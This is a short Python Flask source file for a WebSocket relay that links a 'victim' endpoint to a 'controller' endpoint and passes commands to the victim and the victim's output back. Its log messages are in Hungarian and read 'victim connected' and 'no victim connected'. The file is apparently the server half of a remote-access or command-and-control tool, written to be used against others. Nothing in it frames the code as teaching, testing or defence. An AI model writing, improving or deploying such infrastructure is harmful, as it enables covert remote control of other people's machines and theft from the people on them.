from flask import Flask, render_template_string
from flask_sock import Sock
import os

app = Flask(__name__)
sock = Sock(app)

victim_ws = None
controller_ws = None

@sock.route('/ws/victim')
def victim(ws):
    global victim_ws
    victim_ws = ws
    print("[+] Áldozat csatlakozott!")
    try:
        while True:
            msg = ws.receive()
            if msg is None: break
            if controller_ws:
                try: controller_ws.send(msg)
                except: pass
    finally:
        victim_ws = None

@sock.route('/ws/control')
def control(ws):
    global controller_ws
    controller_ws = ws
    print("[+] Vezérlő csatlakozott!")
    try:
        while True:
            cmd = ws.receive()
            if cmd is None: break
            if victim_ws:
                try: victim_ws.send(cmd)
                except: pass
            else:
                ws.send("[-] Nincs csatlakozott áldozat!")
    finally:
        controller_ws = None

@app.route('/')
def index():
    return "VVVV Relay Active"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
